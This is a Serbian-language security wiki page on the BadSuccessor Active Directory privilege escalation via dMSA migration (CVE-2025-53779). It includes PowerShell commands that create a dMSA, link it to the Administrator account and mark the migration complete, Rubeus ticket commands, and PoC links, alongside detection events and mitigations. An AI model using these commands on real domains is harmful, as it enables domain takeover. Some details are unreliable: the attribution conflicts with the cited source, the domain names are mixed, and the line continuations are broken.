# BadSuccessor: Eskalacija privilegija zloupotrebom delegirane dMSA migracije

{{#include ../../banners/hacktricks-training.md}}

## Pregled

Delegirani Managed Service Accounts (**dMSA**) predstavljaju sledeću generaciju naslednika **gMSA** naloga, koji su dostupni u Windows Server 2025. Legitimni workflow migracije omogućava administratorima da zamene *stari* nalog (korisnički, računara ili servisni nalog) dMSA nalogom, uz transparentno očuvanje dozvola. Workflow je izložen kroz PowerShell cmdlet-e kao što su `Start-ADServiceAccountMigration` i `Complete-ADServiceAccountMigration` i oslanja se na dva LDAP atributa **dMSA objekta**:

* **`msDS-ManagedAccountPrecededByLink`** – *DN link* ka zamenjenom (starom) nalogu.
* **`msDS-DelegatedMSAState`**       – stanje migracije (`0` = nijedno, `1` = u toku, `2` = *završeno*).<sup>[[1]](#references)</sup>

Ako napadač može da kreira **bilo koji** dMSA unutar OU-a i direktno izmeni ta 2 atributa, LSASS i KDC će tretirati dMSA kao *naslednika* povezanog naloga. Kada se napadač naknadno autentifikuje kao dMSA, **nasleđuje sve privilegije povezanog naloga** – sve do nivoa **Domain Admin** ako je povezan Administrator nalog.<sup>[[1]](#references)</sup>

Ovu tehniku je 2025. godine nazvao **BadSuccessor** tim Unit 42. Microsoft joj je kasnije dodelio oznaku **CVE-2025-53779** i objavio security update u **avgustu 2025.** Tehnika je i dalje relevantna za nepatch-ovana Windows Server 2025 okruženja i za provere opasne OU delegacije.<sup>[[1]](#references)[[2]](#references)[[6]](#references)</sup>

### Preduslovi napada

1. Nalog koji ima *dozvolu* za kreiranje objekata unutar **Organizational Unit-a (OU)** *i* ima najmanje jednu od sledećih dozvola:
* `Create Child` → klasa objekta **`msDS-DelegatedManagedServiceAccount`**
* `Create Child` → **`All Objects`** (generičko kreiranje)
2. Mrežna povezanost sa LDAP-om i Kerberos-om (standardni scenario sa računarom pridruženim domenu / remote napad).<sup>[[1]](#references)</sup>

## Enumeracija ranjivih OU-ova

Unit 42 je objavio PowerShell pomoćni script koji parsira security descriptore svakog OU-a i ističe potrebne ACE-ove:<sup>[[1]](#references)</sup>
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
Ispod haube, skripta izvršava paginiranu LDAP pretragu za `(objectClass=organizationalUnit)` i proverava svaki `nTSecurityDescriptor` za

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (klasa objekta *msDS-DelegatedManagedServiceAccount*)

## Koraci eksploatacije

Kada se identifikuje OU u koji je moguće upisivati, napad zahteva samo 3 LDAP upisa:<sup>[[1]](#references)</sup>
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Nakon replikacije, napadač se jednostavno može **logon** kao `attacker_dMSA$` ili zatražiti Kerberos TGT – Windows će izgraditi token *zamenjenog* naloga.<sup>[[1]](#references)</sup>

### Automatizacija

Nekoliko javno dostupnih PoC-ova obuhvata ceo workflow, uključujući preuzimanje lozinke i upravljanje ticket-ima:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* NetExec module – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Detekcija i Hunting

Omogućite **Object Auditing** na OU-ovima i nadgledajte sledeće Windows Security Events:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – Kreiranje **dMSA** objekta
* **5136** – Izmena atributa **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Promene određenih atributa
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – Izdavanje TGT-a za dMSA

Korelacija događaja `4662` (izmena atributa), `4741` (kreiranje computer/service account naloga) i `4624` (naknadna prijava) brzo ukazuje na BadSuccessor aktivnost. XDR rešenja kao što je **XSIAM** dolaze sa gotovim upitima (pogledajte reference).<sup>[[2]](#references)</sup>

## Ublažavanje

* Primenite Microsoft bezbednosnu ispravku za **CVE-2025-53779** i proverite nivo zakrpa svakog Windows Server 2025 domain controller-a.<sup>[[6]](#references)</sup>
* Primenite princip **najmanjih privilegija** – upravljanje *Service Account* nalozima delegirajte samo pouzdanim ulogama.
* Uklonite `Create Child` / `msDS-DelegatedManagedServiceAccount` sa OU-ova koji to izričito ne zahtevaju.
* Nadgledajte gore navedene ID-jeve događaja i generišite upozorenja kada identiteti koji nisu *Tier-0* kreiraju ili menjaju dMSA naloge.

## Pogledajte takođe


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor: Zloupotreba dMSA za eskalaciju privilegija u Active Directory – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – Kada dobri nalozi postanu loši: Iskorišćavanje Delegated Managed Service Accounts](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [NetExec BadSuccessor modul](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
- [6] [Microsoft Security Response Center – CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
{{#include ../../banners/hacktricks-training.md}}
